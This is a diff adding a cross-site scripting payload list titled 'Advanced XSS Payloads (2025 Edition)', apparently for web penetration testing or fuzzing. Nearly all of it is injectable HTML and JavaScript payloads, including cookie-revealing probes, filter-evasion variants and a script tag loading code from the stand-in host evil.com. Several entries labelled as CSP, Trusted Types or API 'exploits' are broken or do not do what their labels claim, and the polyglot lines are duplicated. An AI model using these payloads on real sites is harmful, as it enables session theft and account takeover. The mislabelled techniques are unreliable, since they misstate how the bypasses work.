@@ -1,0 +1,143 @@
+# Advanced XSS Payloads (2025 Edition)
+# General
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<math><mtext></mtext><mtext></mtext><mtext></mtext></math>
+<video><source onerror="javascript:alert(1)">
+<audio src=x onerror=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<marquee onstart=alert(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<input autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<div onmouseover="alert(1)">hover me</div>
+<div onclick="alert(1)">click me</div>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>alert(1);//<</script>
+<script src=//evil.com/xss.js></script>
+<script>eval('al'+'ert(1)')</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>throw onerror=alert,1</script>
+<script>try{null.toUpperCase()}catch(e){alert(1)}</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',0)</script>
+<script>window['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>frames['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>globalThis['alert'](1)</script>
+<script>var x = 'al' + 'ert(1)'; eval(x);</script>
+<script>new Function('alert(1)')();</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>this['alert'](1)</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.write('<iframe src="javascript:alert(1)">')</script>
+"><script>alert(1)</script>
+<svg><script>alert(1)</script></svg>
+<svg><animate attributeName=x dur=1s onbegin=alert(1)>
+<svg><animate attributeName=x dur=1s onend=alert(1)>
+<svg><set attributeName=x dur=1s onbegin=alert(1)>
+<svg><set attributeName=x dur=1s onend=alert(1)>
+<svg><style>{font-family:'<iframe/onload=alert(1)>'}</style>
+<iframe src="javascript:alert(`1`)">
+javascript:alert(1)
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+<a href="javascript:alert(1)">Click me</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click me</a>
+<math href="javascript:alert(1)">CLICKME</math>
+<var onmouseover="alert(1)">hover here</var>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=eval,'=alert\x281\x29'</script>
+<script>var{a:onerror=alert,b:c}=0</script>
+<script>function a(){onerror=alert;throw 1}a()</script>
+<script>try{null.toUpperCase()}catch(e){alert(document.domain)}</script>
+<script>try{null.toUpperCase()}catch(e){alert(document.cookie)}</script>
+<script>setTimeout(()=>alert(1),0)</script>
+<script>setInterval(()=>alert(1),0)</script>
+<script>window['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>frames['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>globalThis['alert'](1)</script>
+<script>var x = 'alert(1)'; new Function(x)();</script>
+<script>var x = 'alert(1)'; setTimeout(x,0);</script>
+<script>var x = 'alert(1)'; setInterval(x,0);</script>
+<script>var x = 'alert(1)'; Function(x)();</script>
+<script>var x = document.createElement('script'); x.innerHTML = 'alert(1)'; document.head.appendChild(x);</script>
+# Polyglot
+<svg><g/onload=alert(1)//<p>
+<svg/onload=alert(1)//
+<svg/onload=confirm(1)//
+<svg/onload=prompt(1)//
+<svg/onload=alert(1)//
+<svg/onload=alert(1)><g>
+<svg/onload=alert(1)><g>
+<svg/onload=alert(1)><g>
+<svg/onload=alert(1)//
+<svg/onload=alert(1)//
+<svg/onload=alert(1)//
+<svg/onload=alert(1)//
+<svg/onload=alert(1)//
+# Advanced Generator Function Exploitation
+<script>function* g(){yield alert(1);}g().next();</script>
+# Clipboard API
+navigator.clipboard.writeText('javascript:alert(1)').then(() => navigator.clipboard.readText().then(eval));
+# Notification API
+Notification.requestPermission().then(() => new Notification('XSS',{body:'pwned',icon:'javascript:alert(1)'}));
+# RegExp Exploit
+RegExp('alert(1)').source.sub(/.*/, eval);
+# CustomEvent Exploit
+window.dispatchEvent(new CustomEvent('xss',{detail:'<img src=x onerror=alert(1)>'}));
+# Trusted Types Bypass
+trustedTypes.createPolicy('default', {createHTML: s => s}).createHTML('<img src=x onerror=alert(1)>');
+# ServiceWorker Exploit
+navigator.serviceWorker.register('data:application/javascript,alert(1)');
+# WebAssembly XSS
+WebAssembly.compileStreaming(fetch('data:application/wasm;base64,AGFzbQEAAAAAAw=='));//payload
+# XSS in Blob URLs
+URL.createObjectURL(new Blob(['<img src=x onerror=alert(1)>'],{type:'text/html'}));
+# iframe sandbox bypass
+<iframe sandbox="allow-scripts allow-same-origin" srcdoc="<script>alert(document.domain)</script>"></iframe>
+# Meta tag CSP bypass
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
+<script>alert(1)</script>
+# DOM Clobbering
+<form id=alert name=alert><input name=call>
+<img name=body id=body src=x>
+<a id=body><a id=body name=innerHTML href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+# Prototype pollution
+<script>Object.prototype.xss='javascript:alert(1)';</script>
+# JSONP/CORS
+<script src="https://trusted-cdn.com/jsonp?callback=alert(1)"></script>
+<script>fetch('https://vulnerable-cors-site.com').then(r=>r.json()).then(data=>alert(JSON.stringify(data)))</script>
+# WebRTC
+const pc = new RTCPeerConnection();pc.createDataChannel('storage').send(JSON.stringify({xss:1}));
+# MutationObserver
+new MutationObserver(()=>alert(1)).observe(document,{childList:true,subtree:true});
+# IntersectionObserver
+new IntersectionObserver(()=>alert(1)).observe(document.body);
+# BroadcastChannel
+new BroadcastChannel('xss').postMessage('<img src=x onerror=alert(1)>');
+# postMessage
+window.addEventListener('message',function(e){eval(e.data)});
+# Polyglot
+<svg><g/onload=alert(1)//<p>
+<svg/onload=alert(1)//
+# More advanced payloads available in custom_payloads/xss.txt
